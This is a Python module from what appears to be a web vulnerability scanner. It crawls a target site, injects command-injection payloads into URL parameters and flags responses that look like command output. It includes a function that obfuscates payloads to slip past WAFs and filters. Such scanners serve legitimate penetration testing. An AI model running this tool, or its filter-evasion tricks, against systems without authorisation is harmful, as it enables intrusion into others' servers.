# command_injection.py

import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
from colorama import Fore, Style
from crawler import crawl_urls
from payload_gen import get_cmdi_payloads
import base64

def obfuscate_payload(payload: str) -> str:
    """
    Simple obfuscation by adding comment-like or ignored characters
    to bypass basic WAFs or filters.
    """
    return payload.replace(" ", "/**/") \
                  .replace(";", ";#") \
                  .replace("&", "&REM") \
                  .replace("|", "|REM")

def encode_payload(payload: str, method: str) -> str:
    if method == 'url':
        return quote(payload)
    elif method == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif method == 'hex':
        return ''.join(f"\\x{ord(c):02x}" for c in payload)
    return payload  # No encoding

def test_command_injection(base_url, platform='all', encode=None, obfuscate=False, verbose=False):
    print(f"\n{Fore.CYAN}[*] Starting Command Injection tests on: {base_url}{Style.RESET_ALL}")

    try:
        urls = crawl_urls(base_url)
    except Exception as e:
        print(f"{Fore.RED}[!] Error crawling target: {e}{Style.RESET_ALL}")
        return

    if not urls:
        print(f"{Fore.YELLOW}[-] No URLs with parameters found to test.{Style.RESET_ALL}")
        return

    # Get categorized payloads and flatten them into a list
    categorized_payloads = get_cmdi_payloads()
    raw_payloads = [p for group in categorized_payloads.values() for p in group]

    # Apply obfuscation (if requested)
    if obfuscate:
        raw_payloads = [obfuscate_payload(p) for p in raw_payloads]

    # Apply encoding (if requested)
    payloads = [encode_payload(p, encode) for p in raw_payloads] if encode else raw_payloads

    found = False

    for url in urls:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{base}?{urlencode(test_params, doseq=True)}"

                if verbose:
                    print(f"{Fore.LIGHTBLACK_EX}[~] Testing: {test_url}{Style.RESET_ALL}")

                try:
                    r = requests.get(test_url, timeout=5)
                    indicators = ["uid=", "gid=", "root", "Microsoft", "Windows", "Linux"]
                    if any(ind in r.text for ind in indicators):
                        print(f"{Fore.GREEN}[+] Possible Command Injection Detected: {test_url}{Style.RESET_ALL}")
                        print(f"    → Payload: {payload}")
                        found = True
                except Exception as e:
                    if verbose:
                        print(f"{Fore.RED}[-] Request failed: {e}{Style.RESET_ALL}")

    if not found:
        print(f"{Fore.YELLOW}[-] No command injection vulnerabilities detected.{Style.RESET_ALL}")
